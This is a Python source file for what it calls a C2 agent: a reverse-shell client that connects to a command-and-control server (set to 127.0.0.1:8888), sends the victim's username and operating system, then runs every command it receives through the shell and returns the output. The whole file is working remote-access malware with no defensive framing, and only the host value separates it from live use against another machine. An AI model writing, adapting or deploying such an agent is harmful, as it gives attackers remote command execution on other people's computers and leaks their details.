import socket
import subprocess
import platform
import getpass  # Module to get the username
global client_socket
client_socket = ''

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except Exception as e:
        return str(e)
    
def get_client_socket(socket):
    global client_socket
    client_socket = str(socket)
    return client_socket

def main():
    host = "127.0.0.1"  # IP address of the C2 server
    port = 8888  # Port the C2 server is listening on

    try:
        username = getpass.getuser()  # Get the current username
        client_os = platform.system()  # Get the client's operating system information
        agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        agent_socket.connect((host, port))
        print("\nConnected to C2 server as:", username)  # Print the username
        agent_socket.send(username.encode())  # Send the username to the server
        agent_socket.send(client_os.encode())  # Send the client's operating system information to the server
        
        
        get_client_socket(agent_socket)
        print('Client socket', client_socket)

        while True:
            command = agent_socket.recv(4096).decode().strip()
            if not command:
                continue
            if command.lower() == "exit":
                break
            output = execute_command(command)
            agent_socket.send(output.encode())

        print("\nClosing connection to C2 server")
        agent_socket.close()
    except Exception as e:
        print(f"\nError: {e}")

if __name__ == "__main__":
    main()
